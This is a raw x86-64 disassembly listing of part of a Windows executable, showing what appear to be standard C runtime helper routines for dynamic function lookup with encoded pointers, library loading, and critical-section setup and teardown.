   140002c71:	90                   	nop
   140002c72:	90                   	nop
   140002c73:	90                   	nop
   140002c74:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   140002c79:	48 89 6c 24 10       	mov    %rbp,0x10(%rsp)
   140002c7e:	48 89 74 24 18       	mov    %rsi,0x18(%rsp)
   140002c83:	57                   	push   %rdi
   140002c84:	41 54                	push   %r12
   140002c86:	41 55                	push   %r13
   140002c88:	41 56                	push   %r14
   140002c8a:	41 57                	push   %r15
   140002c8c:	48 83 ec 20          	sub    $0x20,%rsp
   140002c90:	45 33 ff             	xor    %r15d,%r15d
   140002c93:	44 8b f1             	mov    %ecx,%r14d
   140002c96:	4d 8b e1             	mov    %r9,%r12
   140002c99:	33 c0                	xor    %eax,%eax
   140002c9b:	49 8b e8             	mov    %r8,%rbp
   140002c9e:	4c 8d 0d 5b d3 ff ff 	lea    -0x2ca5(%rip),%r9        # 0x140000000
   140002ca5:	4c 8b ea             	mov    %rdx,%r13
   140002ca8:	f0 4f 0f b1 bc f1 60 	lock cmpxchg %r15,0x15f60(%r9,%r14,8)
   140002caf:	5f 01 00 
   140002cb2:	4c 8b 05 5f 23 01 00 	mov    0x1235f(%rip),%r8        # 0x140015018
   140002cb9:	48 83 cf ff          	or     $0xffffffffffffffff,%rdi
   140002cbd:	41 8b c8             	mov    %r8d,%ecx
   140002cc0:	49 8b d0             	mov    %r8,%rdx
   140002cc3:	83 e1 3f             	and    $0x3f,%ecx
   140002cc6:	48 33 d0             	xor    %rax,%rdx
   140002cc9:	48 d3 ca             	ror    %cl,%rdx
   140002ccc:	48 3b d7             	cmp    %rdi,%rdx
   140002ccf:	0f 84 48 01 00 00    	je     0x140002e1d
   140002cd5:	48 85 d2             	test   %rdx,%rdx
   140002cd8:	74 08                	je     0x140002ce2
   140002cda:	48 8b c2             	mov    %rdx,%rax
   140002cdd:	e9 3d 01 00 00       	jmp    0x140002e1f
   140002ce2:	49 3b ec             	cmp    %r12,%rbp
   140002ce5:	0f 84 be 00 00 00    	je     0x140002da9
   140002ceb:	8b 75 00             	mov    0x0(%rbp),%esi
   140002cee:	33 c0                	xor    %eax,%eax
   140002cf0:	f0 4d 0f b1 bc f1 40 	lock cmpxchg %r15,0x15f40(%r9,%rsi,8)
   140002cf7:	5f 01 00 
   140002cfa:	48 8b d8             	mov    %rax,%rbx
   140002cfd:	74 0e                	je     0x140002d0d
   140002cff:	48 3b c7             	cmp    %rdi,%rax
   140002d02:	0f 84 8d 00 00 00    	je     0x140002d95
   140002d08:	e9 83 00 00 00       	jmp    0x140002d90
   140002d0d:	4d 8b bc f1 e0 c3 00 	mov    0xc3e0(%r9,%rsi,8),%r15
   140002d14:	00 
   140002d15:	33 d2                	xor    %edx,%edx
   140002d17:	49 8b cf             	mov    %r15,%rcx
   140002d1a:	41 b8 00 08 00 00    	mov    $0x800,%r8d
   140002d20:	ff 15 12 94 00 00    	call   *0x9412(%rip)        # 0x14000c138
   140002d26:	48 8b d8             	mov    %rax,%rbx
   140002d29:	48 85 c0             	test   %rax,%rax
   140002d2c:	74 05                	je     0x140002d33
   140002d2e:	45 33 ff             	xor    %r15d,%r15d
   140002d31:	eb 24                	jmp    0x140002d57
   140002d33:	ff 15 c7 92 00 00    	call   *0x92c7(%rip)        # 0x14000c000
   140002d39:	83 f8 57             	cmp    $0x57,%eax
   140002d3c:	75 13                	jne    0x140002d51
   140002d3e:	45 33 c0             	xor    %r8d,%r8d
   140002d41:	33 d2                	xor    %edx,%edx
   140002d43:	49 8b cf             	mov    %r15,%rcx
   140002d46:	ff 15 ec 93 00 00    	call   *0x93ec(%rip)        # 0x14000c138
   140002d4c:	48 8b d8             	mov    %rax,%rbx
   140002d4f:	eb dd                	jmp    0x140002d2e
   140002d51:	45 33 ff             	xor    %r15d,%r15d
   140002d54:	41 8b df             	mov    %r15d,%ebx
   140002d57:	4c 8d 0d a2 d2 ff ff 	lea    -0x2d5e(%rip),%r9        # 0x140000000
   140002d5e:	48 85 db             	test   %rbx,%rbx
   140002d61:	75 0d                	jne    0x140002d70
   140002d63:	48 8b c7             	mov    %rdi,%rax
   140002d66:	49 87 84 f1 40 5f 01 	xchg   %rax,0x15f40(%r9,%rsi,8)
   140002d6d:	00 
   140002d6e:	eb 25                	jmp    0x140002d95
   140002d70:	48 8b c3             	mov    %rbx,%rax
   140002d73:	49 87 84 f1 40 5f 01 	xchg   %rax,0x15f40(%r9,%rsi,8)
   140002d7a:	00 
   140002d7b:	48 85 c0             	test   %rax,%rax
   140002d7e:	74 10                	je     0x140002d90
   140002d80:	48 8b cb             	mov    %rbx,%rcx
   140002d83:	ff 15 a7 93 00 00    	call   *0x93a7(%rip)        # 0x14000c130
   140002d89:	4c 8d 0d 70 d2 ff ff 	lea    -0x2d90(%rip),%r9        # 0x140000000
   140002d90:	48 85 db             	test   %rbx,%rbx
   140002d93:	75 5d                	jne    0x140002df2
   140002d95:	48 83 c5 04          	add    $0x4,%rbp
   140002d99:	49 3b ec             	cmp    %r12,%rbp
   140002d9c:	0f 85 49 ff ff ff    	jne    0x140002ceb
   140002da2:	4c 8b 05 6f 22 01 00 	mov    0x1226f(%rip),%r8        # 0x140015018
   140002da9:	49 8b df             	mov    %r15,%rbx
   140002dac:	48 85 db             	test   %rbx,%rbx
   140002daf:	74 4a                	je     0x140002dfb
   140002db1:	49 8b d5             	mov    %r13,%rdx
   140002db4:	48 8b cb             	mov    %rbx,%rcx
   140002db7:	ff 15 63 92 00 00    	call   *0x9263(%rip)        # 0x14000c020
   140002dbd:	4c 8b 05 54 22 01 00 	mov    0x12254(%rip),%r8        # 0x140015018
   140002dc4:	48 85 c0             	test   %rax,%rax
   140002dc7:	74 32                	je     0x140002dfb
   140002dc9:	41 8b c8             	mov    %r8d,%ecx
   140002dcc:	ba 40 00 00 00       	mov    $0x40,%edx
   140002dd1:	83 e1 3f             	and    $0x3f,%ecx
   140002dd4:	2b d1                	sub    %ecx,%edx
   140002dd6:	8a ca                	mov    %dl,%cl
   140002dd8:	48 8b d0             	mov    %rax,%rdx
   140002ddb:	48 d3 ca             	ror    %cl,%rdx
   140002dde:	48 8d 0d 1b d2 ff ff 	lea    -0x2de5(%rip),%rcx        # 0x140000000
   140002de5:	49 33 d0             	xor    %r8,%rdx
   140002de8:	4a 87 94 f1 60 5f 01 	xchg   %rdx,0x15f60(%rcx,%r14,8)
   140002def:	00 
   140002df0:	eb 2d                	jmp    0x140002e1f
   140002df2:	4c 8b 05 1f 22 01 00 	mov    0x1221f(%rip),%r8        # 0x140015018
   140002df9:	eb b1                	jmp    0x140002dac
   140002dfb:	b9 40 00 00 00       	mov    $0x40,%ecx
   140002e00:	41 8b c0             	mov    %r8d,%eax
   140002e03:	83 e0 3f             	and    $0x3f,%eax
   140002e06:	2b c8                	sub    %eax,%ecx
   140002e08:	48 d3 cf             	ror    %cl,%rdi
   140002e0b:	48 8d 0d ee d1 ff ff 	lea    -0x2e12(%rip),%rcx        # 0x140000000
   140002e12:	49 33 f8             	xor    %r8,%rdi
   140002e15:	4a 87 bc f1 60 5f 01 	xchg   %rdi,0x15f60(%rcx,%r14,8)
   140002e1c:	00 
   140002e1d:	33 c0                	xor    %eax,%eax
   140002e1f:	48 8b 5c 24 50       	mov    0x50(%rsp),%rbx
   140002e24:	48 8b 6c 24 58       	mov    0x58(%rsp),%rbp
   140002e29:	48 8b 74 24 60       	mov    0x60(%rsp),%rsi
   140002e2e:	48 83 c4 20          	add    $0x20,%rsp
   140002e32:	41 5f                	pop    %r15
   140002e34:	41 5e                	pop    %r14
   140002e36:	41 5d                	pop    %r13
   140002e38:	41 5c                	pop    %r12
   140002e3a:	5f                   	pop    %rdi
   140002e3b:	c3                   	ret
   140002e3c:	48 8b c4             	mov    %rsp,%rax
   140002e3f:	48 89 58 08          	mov    %rbx,0x8(%rax)
   140002e43:	48 89 68 10          	mov    %rbp,0x10(%rax)
   140002e47:	48 89 70 18          	mov    %rsi,0x18(%rax)
   140002e4b:	48 89 78 20          	mov    %rdi,0x20(%rax)
   140002e4f:	41 56                	push   %r14
   140002e51:	48 83 ec 20          	sub    $0x20,%rsp
   140002e55:	49 8b f9             	mov    %r9,%rdi
   140002e58:	49 8b f0             	mov    %r8,%rsi
   140002e5b:	48 8b ea             	mov    %rdx,%rbp
   140002e5e:	4c 8d 0d 4b 96 00 00 	lea    0x964b(%rip),%r9        # 0x14000c4b0
   140002e65:	4c 8b f1             	mov    %rcx,%r14
   140002e68:	4c 8d 05 3d 96 00 00 	lea    0x963d(%rip),%r8        # 0x14000c4ac
   140002e6f:	48 8d 15 3a 96 00 00 	lea    0x963a(%rip),%rdx        # 0x14000c4b0
   140002e76:	33 c9                	xor    %ecx,%ecx
   140002e78:	e8 f7 fd ff ff       	call   0x140002c74
   140002e7d:	48 8b d8             	mov    %rax,%rbx
   140002e80:	48 85 c0             	test   %rax,%rax
   140002e83:	74 18                	je     0x140002e9d
   140002e85:	48 8b c8             	mov    %rax,%rcx
   140002e88:	e8 bf f2 ff ff       	call   0x14000214c
   140002e8d:	4c 8b cf             	mov    %rdi,%r9
   140002e90:	4c 8b c6             	mov    %rsi,%r8
   140002e93:	48 8b d5             	mov    %rbp,%rdx
   140002e96:	49 8b ce             	mov    %r14,%rcx
   140002e99:	ff d3                	call   *%rbx
   140002e9b:	eb 05                	jmp    0x140002ea2
   140002e9d:	b8 32 00 00 00       	mov    $0x32,%eax
   140002ea2:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   140002ea7:	48 8b 6c 24 38       	mov    0x38(%rsp),%rbp
   140002eac:	48 8b 74 24 40       	mov    0x40(%rsp),%rsi
   140002eb1:	48 8b 7c 24 48       	mov    0x48(%rsp),%rdi
   140002eb6:	48 83 c4 20          	add    $0x20,%rsp
   140002eba:	41 5e                	pop    %r14
   140002ebc:	c3                   	ret
   140002ebd:	90                   	nop
   140002ebe:	90                   	nop
   140002ebf:	90                   	nop
   140002ec0:	48 8b c4             	mov    %rsp,%rax
   140002ec3:	48 89 58 08          	mov    %rbx,0x8(%rax)
   140002ec7:	48 89 68 10          	mov    %rbp,0x10(%rax)
   140002ecb:	48 89 70 18          	mov    %rsi,0x18(%rax)
   140002ecf:	48 89 78 20          	mov    %rdi,0x20(%rax)
   140002ed3:	41 56                	push   %r14
   140002ed5:	48 83 ec 20          	sub    $0x20,%rsp
   140002ed9:	41 8b f9             	mov    %r9d,%edi
   140002edc:	49 8b f0             	mov    %r8,%rsi
   140002edf:	8b ea                	mov    %edx,%ebp
   140002ee1:	4c 8d 0d dc 95 00 00 	lea    0x95dc(%rip),%r9        # 0x14000c4c4
   140002ee8:	4c 8b f1             	mov    %rcx,%r14
   140002eeb:	4c 8d 05 ce 95 00 00 	lea    0x95ce(%rip),%r8        # 0x14000c4c0
   140002ef2:	48 8d 15 cf 95 00 00 	lea    0x95cf(%rip),%rdx        # 0x14000c4c8
   140002ef9:	b9 01 00 00 00       	mov    $0x1,%ecx
   140002efe:	e8 71 fd ff ff       	call   0x140002c74
   140002f03:	48 8b d8             	mov    %rax,%rbx
   140002f06:	48 85 c0             	test   %rax,%rax
   140002f09:	74 17                	je     0x140002f22
   140002f0b:	48 8b c8             	mov    %rax,%rcx
   140002f0e:	e8 39 f2 ff ff       	call   0x14000214c
   140002f13:	44 8b cf             	mov    %edi,%r9d
   140002f16:	4c 8b c6             	mov    %rsi,%r8
   140002f19:	8b d5                	mov    %ebp,%edx
   140002f1b:	49 8b ce             	mov    %r14,%rcx
   140002f1e:	ff d3                	call   *%rbx
   140002f20:	eb 05                	jmp    0x140002f27
   140002f22:	b8 32 00 00 00       	mov    $0x32,%eax
   140002f27:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   140002f2c:	48 8b 6c 24 38       	mov    0x38(%rsp),%rbp
   140002f31:	48 8b 74 24 40       	mov    0x40(%rsp),%rsi
   140002f36:	48 8b 7c 24 48       	mov    0x48(%rsp),%rdi
   140002f3b:	48 83 c4 20          	add    $0x20,%rsp
   140002f3f:	41 5e                	pop    %r14
   140002f41:	c3                   	ret
   140002f42:	90                   	nop
   140002f43:	90                   	nop
   140002f44:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   140002f49:	57                   	push   %rdi
   140002f4a:	48 83 ec 20          	sub    $0x20,%rsp
   140002f4e:	48 8b f9             	mov    %rcx,%rdi
   140002f51:	4c 8d 0d 88 95 00 00 	lea    0x9588(%rip),%r9        # 0x14000c4e0
   140002f58:	b9 02 00 00 00       	mov    $0x2,%ecx
   140002f5d:	4c 8d 05 78 95 00 00 	lea    0x9578(%rip),%r8        # 0x14000c4dc
   140002f64:	48 8d 15 75 95 00 00 	lea    0x9575(%rip),%rdx        # 0x14000c4e0
   140002f6b:	e8 04 fd ff ff       	call   0x140002c74
   140002f70:	48 8b d8             	mov    %rax,%rbx
   140002f73:	48 85 c0             	test   %rax,%rax
   140002f76:	74 0f                	je     0x140002f87
   140002f78:	48 8b c8             	mov    %rax,%rcx
   140002f7b:	e8 cc f1 ff ff       	call   0x14000214c
   140002f80:	48 8b cf             	mov    %rdi,%rcx
   140002f83:	ff d3                	call   *%rbx
   140002f85:	eb 05                	jmp    0x140002f8c
   140002f87:	b8 32 00 00 00       	mov    $0x32,%eax
   140002f8c:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   140002f91:	48 83 c4 20          	add    $0x20,%rsp
   140002f95:	5f                   	pop    %rdi
   140002f96:	c3                   	ret
   140002f97:	90                   	nop
   140002f98:	48 8b c4             	mov    %rsp,%rax
   140002f9b:	48 89 58 08          	mov    %rbx,0x8(%rax)
   140002f9f:	48 89 68 10          	mov    %rbp,0x10(%rax)
   140002fa3:	48 89 70 18          	mov    %rsi,0x18(%rax)
   140002fa7:	48 89 78 20          	mov    %rdi,0x20(%rax)
   140002fab:	41 56                	push   %r14
   140002fad:	48 83 ec 30          	sub    $0x30,%rsp
   140002fb1:	49 8b f9             	mov    %r9,%rdi
   140002fb4:	49 8b f0             	mov    %r8,%rsi
   140002fb7:	48 8b ea             	mov    %rdx,%rbp
   140002fba:	4c 8d 0d 33 95 00 00 	lea    0x9533(%rip),%r9        # 0x14000c4f4
   140002fc1:	4c 8b f1             	mov    %rcx,%r14
   140002fc4:	4c 8d 05 25 95 00 00 	lea    0x9525(%rip),%r8        # 0x14000c4f0
   140002fcb:	48 8d 15 26 95 00 00 	lea    0x9526(%rip),%rdx        # 0x14000c4f8
   140002fd2:	b9 03 00 00 00       	mov    $0x3,%ecx
   140002fd7:	e8 98 fc ff ff       	call   0x140002c74
   140002fdc:	48 8b d8             	mov    %rax,%rbx
   140002fdf:	48 85 c0             	test   %rax,%rax
   140002fe2:	74 2a                	je     0x14000300e
   140002fe4:	48 8b c8             	mov    %rax,%rcx
   140002fe7:	e8 60 f1 ff ff       	call   0x14000214c
   140002fec:	48 8b 4c 24 68       	mov    0x68(%rsp),%rcx
   140002ff1:	4c 8b cf             	mov    %rdi,%r9
   140002ff4:	48 89 4c 24 28       	mov    %rcx,0x28(%rsp)
   140002ff9:	4c 8b c6             	mov    %rsi,%r8
   140002ffc:	8b 4c 24 60          	mov    0x60(%rsp),%ecx
   140003000:	48 8b d5             	mov    %rbp,%rdx
   140003003:	89 4c 24 20          	mov    %ecx,0x20(%rsp)
   140003007:	49 8b ce             	mov    %r14,%rcx
   14000300a:	ff d3                	call   *%rbx
   14000300c:	eb 05                	jmp    0x140003013
   14000300e:	b8 32 00 00 00       	mov    $0x32,%eax
   140003013:	48 8b 5c 24 40       	mov    0x40(%rsp),%rbx
   140003018:	48 8b 6c 24 48       	mov    0x48(%rsp),%rbp
   14000301d:	48 8b 74 24 50       	mov    0x50(%rsp),%rsi
   140003022:	48 8b 7c 24 58       	mov    0x58(%rsp),%rdi
   140003027:	48 83 c4 30          	add    $0x30,%rsp
   14000302b:	41 5e                	pop    %r14
   14000302d:	c3                   	ret
   14000302e:	90                   	nop
   14000302f:	90                   	nop
   140003030:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   140003035:	57                   	push   %rdi
   140003036:	48 83 ec 20          	sub    $0x20,%rsp
   14000303a:	48 8b f9             	mov    %rcx,%rdi
   14000303d:	4c 8d 0d d4 94 00 00 	lea    0x94d4(%rip),%r9        # 0x14000c518
   140003044:	b9 04 00 00 00       	mov    $0x4,%ecx
   140003049:	4c 8d 05 c0 94 00 00 	lea    0x94c0(%rip),%r8        # 0x14000c510
   140003050:	48 8d 15 c1 94 00 00 	lea    0x94c1(%rip),%rdx        # 0x14000c518
   140003057:	e8 18 fc ff ff       	call   0x140002c74
   14000305c:	48 8b d8             	mov    %rax,%rbx
   14000305f:	48 85 c0             	test   %rax,%rax
   140003062:	74 0f                	je     0x140003073
   140003064:	48 8b c8             	mov    %rax,%rcx
   140003067:	e8 e0 f0 ff ff       	call   0x14000214c
   14000306c:	48 8b cf             	mov    %rdi,%rcx
   14000306f:	ff d3                	call   *%rbx
   140003071:	eb 06                	jmp    0x140003079
   140003073:	ff 15 97 90 00 00    	call   *0x9097(%rip)        # 0x14000c110
   140003079:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   14000307e:	48 83 c4 20          	add    $0x20,%rsp
   140003082:	5f                   	pop    %rdi
   140003083:	c3                   	ret
   140003084:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   140003089:	57                   	push   %rdi
   14000308a:	48 83 ec 20          	sub    $0x20,%rsp
   14000308e:	8b d9                	mov    %ecx,%ebx
   140003090:	4c 8d 0d 99 94 00 00 	lea    0x9499(%rip),%r9        # 0x14000c530
   140003097:	b9 05 00 00 00       	mov    $0x5,%ecx
   14000309c:	4c 8d 05 85 94 00 00 	lea    0x9485(%rip),%r8        # 0x14000c528
   1400030a3:	48 8d 15 86 94 00 00 	lea    0x9486(%rip),%rdx        # 0x14000c530
   1400030aa:	e8 c5 fb ff ff       	call   0x140002c74
   1400030af:	48 8b f8             	mov    %rax,%rdi
   1400030b2:	48 85 c0             	test   %rax,%rax
   1400030b5:	74 0e                	je     0x1400030c5
   1400030b7:	48 8b c8             	mov    %rax,%rcx
   1400030ba:	e8 8d f0 ff ff       	call   0x14000214c
   1400030bf:	8b cb                	mov    %ebx,%ecx
   1400030c1:	ff d7                	call   *%rdi
   1400030c3:	eb 08                	jmp    0x1400030cd
   1400030c5:	8b cb                	mov    %ebx,%ecx
   1400030c7:	ff 15 5b 90 00 00    	call   *0x905b(%rip)        # 0x14000c128
   1400030cd:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   1400030d2:	48 83 c4 20          	add    $0x20,%rsp
   1400030d6:	5f                   	pop    %rdi
   1400030d7:	c3                   	ret
   1400030d8:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   1400030dd:	48 89 74 24 10       	mov    %rsi,0x10(%rsp)
   1400030e2:	57                   	push   %rdi
   1400030e3:	48 83 ec 20          	sub    $0x20,%rsp
   1400030e7:	48 8b da             	mov    %rdx,%rbx
   1400030ea:	4c 8d 0d 5f 94 00 00 	lea    0x945f(%rip),%r9        # 0x14000c550
   1400030f1:	8b f9                	mov    %ecx,%edi
   1400030f3:	48 8d 15 56 94 00 00 	lea    0x9456(%rip),%rdx        # 0x14000c550
   1400030fa:	b9 07 00 00 00       	mov    $0x7,%ecx
   1400030ff:	4c 8d 05 42 94 00 00 	lea    0x9442(%rip),%r8        # 0x14000c548
   140003106:	e8 69 fb ff ff       	call   0x140002c74
   14000310b:	48 8b f0             	mov    %rax,%rsi
   14000310e:	48 85 c0             	test   %rax,%rax
   140003111:	74 11                	je     0x140003124
   140003113:	48 8b c8             	mov    %rax,%rcx
   140003116:	e8 31 f0 ff ff       	call   0x14000214c
   14000311b:	48 8b d3             	mov    %rbx,%rdx
   14000311e:	8b cf                	mov    %edi,%ecx
   140003120:	ff d6                	call   *%rsi
   140003122:	eb 0b                	jmp    0x14000312f
   140003124:	48 8b d3             	mov    %rbx,%rdx
   140003127:	8b cf                	mov    %edi,%ecx
   140003129:	ff 15 f1 8f 00 00    	call   *0x8ff1(%rip)        # 0x14000c120
   14000312f:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   140003134:	48 8b 74 24 38       	mov    0x38(%rsp),%rsi
   140003139:	48 83 c4 20          	add    $0x20,%rsp
   14000313d:	5f                   	pop    %rdi
   14000313e:	c3                   	ret
   14000313f:	90                   	nop
   140003140:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   140003145:	48 89 6c 24 10       	mov    %rbp,0x10(%rsp)
   14000314a:	48 89 74 24 18       	mov    %rsi,0x18(%rsp)
   14000314f:	57                   	push   %rdi
   140003150:	48 83 ec 20          	sub    $0x20,%rsp
   140003154:	41 8b e8             	mov    %r8d,%ebp
   140003157:	4c 8d 0d 0a 94 00 00 	lea    0x940a(%rip),%r9        # 0x14000c568
   14000315e:	8b da                	mov    %edx,%ebx
   140003160:	4c 8d 05 f9 93 00 00 	lea    0x93f9(%rip),%r8        # 0x14000c560
   140003167:	48 8b f9             	mov    %rcx,%rdi
   14000316a:	48 8d 15 f7 93 00 00 	lea    0x93f7(%rip),%rdx        # 0x14000c568
   140003171:	b9 08 00 00 00       	mov    $0x8,%ecx
   140003176:	e8 f9 fa ff ff       	call   0x140002c74
   14000317b:	48 8b f0             	mov    %rax,%rsi
   14000317e:	48 85 c0             	test   %rax,%rax
   140003181:	74 14                	je     0x140003197
   140003183:	48 8b c8             	mov    %rax,%rcx
   140003186:	e8 c1 ef ff ff       	call   0x14000214c
   14000318b:	44 8b c5             	mov    %ebp,%r8d
   14000318e:	8b d3                	mov    %ebx,%edx
   140003190:	48 8b cf             	mov    %rdi,%rcx
   140003193:	ff d6                	call   *%rsi
   140003195:	eb 0b                	jmp    0x1400031a2
   140003197:	8b d3                	mov    %ebx,%edx
   140003199:	48 8b cf             	mov    %rdi,%rcx
   14000319c:	ff 15 66 8f 00 00    	call   *0x8f66(%rip)        # 0x14000c108
   1400031a2:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   1400031a7:	48 8b 6c 24 38       	mov    0x38(%rsp),%rbp
   1400031ac:	48 8b 74 24 40       	mov    0x40(%rsp),%rsi
   1400031b1:	48 83 c4 20          	add    $0x20,%rsp
   1400031b5:	5f                   	pop    %rdi
   1400031b6:	c3                   	ret
   1400031b7:	90                   	nop
   1400031b8:	48 89 7c 24 08       	mov    %rdi,0x8(%rsp)
   1400031bd:	48 8b 15 54 1e 01 00 	mov    0x11e54(%rip),%rdx        # 0x140015018
   1400031c4:	48 8d 3d 95 2d 01 00 	lea    0x12d95(%rip),%rdi        # 0x140015f60
   1400031cb:	8b c2                	mov    %edx,%eax
   1400031cd:	b9 40 00 00 00       	mov    $0x40,%ecx
   1400031d2:	83 e0 3f             	and    $0x3f,%eax
   1400031d5:	2b c8                	sub    %eax,%ecx
   1400031d7:	33 c0                	xor    %eax,%eax
   1400031d9:	48 d3 c8             	ror    %cl,%rax
   1400031dc:	b9 09 00 00 00       	mov    $0x9,%ecx
   1400031e1:	48 33 c2             	xor    %rdx,%rax
   1400031e4:	f3 48 ab             	rep stos %rax,(%rdi)
   1400031e7:	48 8b 7c 24 08       	mov    0x8(%rsp),%rdi
   1400031ec:	c3                   	ret
   1400031ed:	90                   	nop
   1400031ee:	90                   	nop
   1400031ef:	90                   	nop
   1400031f0:	84 c9                	test   %cl,%cl
   1400031f2:	75 39                	jne    0x14000322d
   1400031f4:	53                   	push   %rbx
   1400031f5:	48 83 ec 20          	sub    $0x20,%rsp
   1400031f9:	48 8d 1d 40 2d 01 00 	lea    0x12d40(%rip),%rbx        # 0x140015f40
   140003200:	48 8b 0b             	mov    (%rbx),%rcx
   140003203:	48 85 c9             	test   %rcx,%rcx
   140003206:	74 10                	je     0x140003218
   140003208:	48 83 f9 ff          	cmp    $0xffffffffffffffff,%rcx
   14000320c:	74 06                	je     0x140003214
   14000320e:	ff 15 1c 8f 00 00    	call   *0x8f1c(%rip)        # 0x14000c130
   140003214:	48 83 23 00          	andq   $0x0,(%rbx)
   140003218:	48 83 c3 08          	add    $0x8,%rbx
   14000321c:	48 8d 05 3d 2d 01 00 	lea    0x12d3d(%rip),%rax        # 0x140015f60
   140003223:	48 3b d8             	cmp    %rax,%rbx
   140003226:	75 d8                	jne    0x140003200
   140003228:	48 83 c4 20          	add    $0x20,%rsp
   14000322c:	5b                   	pop    %rbx
   14000322d:	c3                   	ret
   14000322e:	90                   	nop
   14000322f:	90                   	nop
   140003230:	48 83 ec 28          	sub    $0x28,%rsp
   140003234:	48 85 c9             	test   %rcx,%rcx
   140003237:	74 11                	je     0x14000324a
   140003239:	48 8d 05 70 2d 01 00 	lea    0x12d70(%rip),%rax        # 0x140015fb0
   140003240:	48 3b c8             	cmp    %rax,%rcx
   140003243:	74 05                	je     0x14000324a
   140003245:	e8 f6 14 00 00       	call   0x140004740
   14000324a:	48 83 c4 28          	add    $0x28,%rsp
   14000324e:	c3                   	ret
   14000324f:	90                   	nop
   140003250:	48 83 ec 28          	sub    $0x28,%rsp
   140003254:	48 8d 0d d5 ff ff ff 	lea    -0x2b(%rip),%rcx        # 0x140003230
   14000325b:	e8 d0 fd ff ff       	call   0x140003030
   140003260:	89 05 2a 1e 01 00    	mov    %eax,0x11e2a(%rip)        # 0x140015090
   140003266:	83 f8 ff             	cmp    $0xffffffff,%eax
   140003269:	75 04                	jne    0x14000326f
   14000326b:	32 c0                	xor    %al,%al
   14000326d:	eb 1b                	jmp    0x14000328a
   14000326f:	48 8d 15 3a 2d 01 00 	lea    0x12d3a(%rip),%rdx        # 0x140015fb0
   140003276:	8b c8                	mov    %eax,%ecx
   140003278:	e8 5b fe ff ff       	call   0x1400030d8
   14000327d:	85 c0                	test   %eax,%eax
   14000327f:	75 07                	jne    0x140003288
   140003281:	e8 0a 00 00 00       	call   0x140003290
   140003286:	eb e3                	jmp    0x14000326b
   140003288:	b0 01                	mov    $0x1,%al
   14000328a:	48 83 c4 28          	add    $0x28,%rsp
   14000328e:	c3                   	ret
   14000328f:	90                   	nop
   140003290:	48 83 ec 28          	sub    $0x28,%rsp
   140003294:	8b 0d f6 1d 01 00    	mov    0x11df6(%rip),%ecx        # 0x140015090
   14000329a:	83 f9 ff             	cmp    $0xffffffff,%ecx
   14000329d:	74 0c                	je     0x1400032ab
   14000329f:	e8 e0 fd ff ff       	call   0x140003084
   1400032a4:	83 0d e5 1d 01 00 ff 	orl    $0xffffffff,0x11de5(%rip)        # 0x140015090
   1400032ab:	b0 01                	mov    $0x1,%al
   1400032ad:	48 83 c4 28          	add    $0x28,%rsp
   1400032b1:	c3                   	ret
   1400032b2:	90                   	nop
   1400032b3:	90                   	nop
   1400032b4:	53                   	push   %rbx
   1400032b5:	48 83 ec 20          	sub    $0x20,%rsp
   1400032b9:	33 db                	xor    %ebx,%ebx
   1400032bb:	48 8d 15 66 2d 01 00 	lea    0x12d66(%rip),%rdx        # 0x140016028
   1400032c2:	45 33 c0             	xor    %r8d,%r8d
   1400032c5:	48 8d 0c 9b          	lea    (%rbx,%rbx,4),%rcx
   1400032c9:	48 8d 0c ca          	lea    (%rdx,%rcx,8),%rcx
   1400032cd:	ba a0 0f 00 00       	mov    $0xfa0,%edx
   1400032d2:	e8 69 fe ff ff       	call   0x140003140
   1400032d7:	85 c0                	test   %eax,%eax
   1400032d9:	74 11                	je     0x1400032ec
   1400032db:	ff 05 6f 2d 01 00    	incl   0x12d6f(%rip)        # 0x140016050
   1400032e1:	ff c3                	inc    %ebx
   1400032e3:	83 fb 01             	cmp    $0x1,%ebx
   1400032e6:	72 d3                	jb     0x1400032bb
   1400032e8:	b0 01                	mov    $0x1,%al
   1400032ea:	eb 07                	jmp    0x1400032f3
   1400032ec:	e8 0b 00 00 00       	call   0x1400032fc
   1400032f1:	32 c0                	xor    %al,%al
   1400032f3:	48 83 c4 20          	add    $0x20,%rsp
   1400032f7:	5b                   	pop    %rbx
   1400032f8:	c3                   	ret
   1400032f9:	90                   	nop
   1400032fa:	90                   	nop
   1400032fb:	90                   	nop
   1400032fc:	53                   	push   %rbx
   1400032fd:	48 83 ec 20          	sub    $0x20,%rsp
   140003301:	8b 1d 49 2d 01 00    	mov    0x12d49(%rip),%ebx        # 0x140016050
   140003307:	eb 1d                	jmp    0x140003326
   140003309:	48 8d 05 18 2d 01 00 	lea    0x12d18(%rip),%rax        # 0x140016028
   140003310:	ff cb                	dec    %ebx
   140003312:	48 8d 0c 9b          	lea    (%rbx,%rbx,4),%rcx
   140003316:	48 8d 0c c8          	lea    (%rax,%rcx,8),%rcx
   14000331a:	ff 15 30 8e 00 00    	call   *0x8e30(%rip)        # 0x14000c150
   140003320:	ff 0d 2a 2d 01 00    	decl   0x12d2a(%rip)        # 0x140016050
   140003326:	85 db                	test   %ebx,%ebx
   140003328:	75 df                	jne    0x140003309
   14000332a:	b0 01                	mov    $0x1,%al
   14000332c:	48 83 c4 20          	add    $0x20,%rsp
   140003330:	5b                   	pop    %rbx
   140003331:	c3                   	ret
   140003332:	90                   	nop
   140003333:	90                   	nop
   140003334:	48 8b 15 dd 1c 01 00 	mov    0x11cdd(%rip),%rdx        # 0x140015018
   14000333b:	b9 40 00 00 00       	mov    $0x40,%ecx
   140003340:	8b c2                	mov    %edx,%eax
   140003342:	83 e0 3f             	and    $0x3f,%eax
   140003345:	2b c8                	sub    %eax,%ecx
   140003347:	33 c0                	xor    %eax,%eax
   140003349:	48 d3 c8             	ror    %cl,%rax
   14000334c:	48 33 c2             	xor    %rdx,%rax
   14000334f:	48 89 05 02 2d 01 00 	mov    %rax,0x12d02(%rip)        # 0x140016058
   140003356:	c3                   	ret
   140003357:	90                   	nop
   140003358:	48 83 ec 28          	sub    $0x28,%rsp
